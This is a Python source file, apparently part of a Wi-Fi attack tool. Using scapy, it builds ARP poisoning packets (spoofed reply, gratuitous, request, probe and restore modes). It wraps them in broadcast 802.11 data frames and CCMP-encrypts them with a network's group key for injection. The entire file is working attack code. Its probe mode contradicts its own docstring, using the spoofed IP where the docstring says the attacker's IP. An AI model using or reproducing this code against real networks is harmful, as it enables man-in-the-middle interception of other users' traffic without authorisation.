"""Frame builders -- pure functions, no I/O. Testable in isolation."""

from __future__ import annotations

from scapy.layers.dot11 import Dot11, Dot11QoS
from scapy.layers.l2 import ARP, LLC, SNAP

# Vendored from libwifi.
from libwifi.crypto import encrypt_ccmp


def build_arp(
    mode: str,
    *,
    attacker_mac: str,
    target_mac: str,
    spoof_ip: str,
    target_ip: str,
    real_mac: str | None = None,
) -> ARP:
    """Build the inner ARP layer for the chosen poisoning mode.

    mode:
        reply       -- unicast op=2: "spoof_ip is at attacker_mac", hwdst=target_mac.
                       Classic poison; most reliable.
        gratuitous  -- broadcast op=2 announcement, hwdst=ff:ff:ff:ff:ff:ff.
        request     -- broadcast op=1 "who has spoof_ip? tell attacker_mac/spoof_ip".
                       Some stacks update cache from incoming requests too.
                       Also used by target-MAC discovery to elicit replies.
        probe       -- broadcast op=1 "who has target_ip? tell attacker_mac".
                       Used by the verify-before-inject probe and active
                       target-MAC discovery; psrc is the attacker's IP, pdst
                       is the suspected victim IP.
        restore     -- unicast op=2 with the real MAC -- for restoration on exit.
    """
    if mode == "reply":
        return ARP(op=2, hwsrc=attacker_mac, psrc=spoof_ip,
                   hwdst=target_mac, pdst=target_ip)
    if mode == "gratuitous":
        return ARP(op=2, hwsrc=attacker_mac, psrc=spoof_ip,
                   hwdst="ff:ff:ff:ff:ff:ff", pdst=spoof_ip)
    if mode == "request":
        return ARP(op=1, hwsrc=attacker_mac, psrc=spoof_ip,
                   hwdst="00:00:00:00:00:00", pdst=target_ip)
    if mode == "probe":
        return ARP(op=1, hwsrc=attacker_mac, psrc=spoof_ip,
                   hwdst="00:00:00:00:00:00", pdst=target_ip)
    if mode == "restore":
        if real_mac is None:
            raise ValueError("restore mode requires real_mac")
        return ARP(op=2, hwsrc=real_mac, psrc=spoof_ip,
                   hwdst=target_mac, pdst=target_ip)
    raise ValueError(f"unknown mode: {mode}")


def build_dot11_arp_plain(
    *, ap_mac: str, arp_layer: ARP, addr3: str = "ff:ff:ff:ff:ff:ff"
) -> Dot11:
    """Wrap an ARP layer in a from-DS QoS-data broadcast 802.11 frame.

    Returns the *unencrypted* frame so callers (and tests) can inspect it
    before CCMP-wrapping. Pass through encrypt_dot11_with_gtk() to get the
    over-the-air bytes.
    """
    dot11 = Dot11(type=2, subtype=8, SC=0)
    dot11 /= Dot11QoS(TID=0)
    dot11.FCfield |= 0x02  # from-DS
    dot11.addr1 = "ff:ff:ff:ff:ff:ff"
    dot11.addr2 = ap_mac
    dot11.addr3 = addr3
    return dot11 / LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / SNAP(code=0x0806) / arp_layer


def encrypt_dot11_with_gtk(plain: Dot11, *, gtk: bytes, pn: int, gtk_idx: int):
    """CCMP-encrypt a plaintext Dot11 frame with the GTK at the given PN."""
    sn = pn & 0xfff
    plain.SC = (sn << 4) & 0xfff0
    return encrypt_ccmp(plain, gtk, pn, keyid=gtk_idx)


def build_arp_over_gtk(
    *,
    ap_mac: str,
    arp_layer: ARP,
    gtk: bytes,
    pn: int,
    gtk_idx: int,
):
    """Convenience: build_dot11_arp_plain() + encrypt_dot11_with_gtk()."""
    plain = build_dot11_arp_plain(ap_mac=ap_mac, arp_layer=arp_layer)
    return encrypt_dot11_with_gtk(plain, gtk=gtk, pn=pn, gtk_idx=gtk_idx)
